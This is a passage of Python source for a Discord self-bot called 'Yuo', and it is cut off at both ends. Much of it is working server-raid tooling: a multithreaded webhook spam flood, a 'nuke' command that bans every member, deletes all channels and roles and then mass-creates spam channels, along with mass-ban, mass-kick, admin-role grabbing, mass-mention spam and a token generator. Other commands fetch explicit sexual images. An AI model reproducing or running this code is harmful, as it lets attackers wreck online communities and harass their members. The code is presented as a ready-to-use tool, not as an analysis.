                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "thumbnail": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/channel/UCyXRWiNe1jZtSqGysahptJQ",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/channel/UCyXRWiNe1jZtSqGysahptJQ",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/channel/UCyXRWiNe1jZtSqGysahptJQ",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            }
          ],
          "username": "Selfbot 2021",
          "avatar_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
        }

        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass 

        elif "rate limited" in spammingerror.lower():
            
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)
@Yuo.command(aliases=['webhookspam'])
async def webhookfuck(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = wspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='Dirty Work Like a Gangsta')
                threading.Thread(target = wspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} Webhook Error")

colour = '1DiOwSXRBMcJykd26G7GKIt14pRFijOPaoCvb'

@Yuo.command(aliases=['stopwebhookfuck'])
async def stopwebhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = False
def merbans(guild, user):
  try:
    headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.5.4044.138 Safari/537.36', 'Accept': '*/*',}
    requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(guild)}/bans/{str(user)}?delete-message-days=7&reason=sex",headers=headers)
  except:
    pass  


@Yuo.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')


@Yuo.command(aliases=["roles"])
async def getroles(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


@Yuo.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)


@Yuo.command(aliases=["rekt", "nuke"])
async def karma(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Yuo No Mercy",
            description="Yuo Selfbot",
            reason="Yuo Selfbot",
            icon="https://media.discordapp.net/attachments/777374893632258099/777396775375077376/image0.png",
            banner=None
        )
    except:
        pass
    for _i in range(400):
        await ctx.guild.create_text_channel(name="Yuo Runs You")
    for _i in range(400):
        await ctx.guild.create_role(name="@myrayuorunsyou", color=RandomColor())


@Yuo.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
async def giveadmin(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass


@Yuo.command(aliases=["banwave", "etb","massb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Yuo")
        except:
            pass


@Yuo.command()
async def coolorcringe(ctx):
    await ctx.message.delete()
    coolorcringelist = ["cool", "cringe"]
    result = random.choice(coolorcringelist)
    await ctx.send(result)


@Yuo.command()
async def add(ctx, arg1, arg2):
    global commanddict
    name = arg1
    returns = arg2
    await ctx.message.delete()
    commanddict[arg1] = arg2
    print(Fore.GREEN + f'[>] Command "{name}" added!' + Style.RESET_ALL)
    with open(csvpath, 'w') as f:
        for key in commanddict.keys():
            f.write("%s,%s\n"%(key,commanddict[key]))


@Yuo.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@Yuo.command(aliases=['mtg'])
async def masstokens(ctx):
    await ctx.message.delete()
    masstokengen()
    embed = discord.Embed(title="**Generated 300 tokens.**", color=0xFFFAFA,
                          description="generated 300 tokens in tokens.txt. these might not work.",
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed)


@Yuo.command(aliases=["kickwave","massk"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Yuo")
        except:
            pass


@Yuo.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Yuo", color=RandomColor())
        except:
            return


@Yuo.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Yuo")
        except:
            return


@Yuo.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Yuo.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@Yuo.command(aliases=["purgebans", "unbanall","massu"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Yuo.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@Yuo.command()
async def dm(ctx, user: discord.User, *, value):
    await ctx.message.delete()
    await user.send(f"{value}")


@Yuo.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'{str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)


@Yuo.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break


@Yuo.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")


@Yuo.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)


@Yuo.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")


@Yuo.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance',
        'Cannot predict how', 
        'My reply is fuck no',
        'Fs Yktv',
        'My sources say hell no',
        'Dont ever ask me that shit again',
        'Yes',
        'It is decidedly so',
        'Outlook not so good',
        'As I see it, yes',
        'Outlook good',
        'Very doubtful',
        'Without a doubt'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_author(name="8Ball | 2021")
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=embed)


@Yuo.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@Yuo.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))


@Yuo.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@Yuo.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@Yuo.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)


@Yuo.command()
async def greyscale(ctx, member: discord.Member = None):
	if not member:
		filename = "greyscale.jpg"
		f = open(filename, 'wb')
		f.write(requests.get(f'{ctx.author.avatar_url}?size=2048').content)
		f.close()
		flr = discord.File(fp=filename)
		image = Image.open(filename)
		greyscale_image = image.convert('L')
		greyscale_image.save(filename)
		await ctx.send("greyscale", file=flr)
	else:
		filename = "greyscale.png"
		var = str(member.avatar_url)
		jpgconv = var.replace('webp', 'png')
		f = open(filename, 'wb')
		f.write(requests.get(jpgconv).content)
		f.close()
		image = Image.open(filename)
		greyscale_image = image.convert('L')
		greyscale_image.save(filename)
		flr = discord.File(fp=filename)
		await ctx.send("greyscale", file=flr)


@Yuo.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Yuo.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@Yuo.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@Yuo.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])


@Yuo.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Yuo.command_prefix = str(prefix)


@Yuo.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@Yuo.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = ctx.send("Starting count to 100")
    await asyncio.sleep(2)
    for _ in range(100):
        await message.edit(content=_)
        await asyncio.sleep(2)





@Yuo.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Yuo.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@Yuo.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")


@Yuo.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Yuo.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Yuo.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Yuo.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@Yuo.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Yuo.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@Yuo.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Yuo.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@Yuo.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Yuo.user.relationships)
    for relationship in Yuo.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


@Yuo.command(aliases=["changeregions", "changeregion", "regionschange"])
async def regionchange(ctx, amount):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        print()


@Yuo.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@Yuo.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Yuo.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


@Yuo.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_dog.png"))
    except:
        await ctx.send(link)


@Yuo.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_cat.png"))
    except:
        await ctx.send(link)


@Yuo.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_sadcat.png"))
    except:
        await ctx.send(link)


@Yuo.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.botSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_bird.png"))
    except:
        await ctx.send(link)


@Yuo.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_fox.png"))
    except:
        await ctx.send(link)


@Yuo.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def erofeet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command(aliases=["neko"])
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
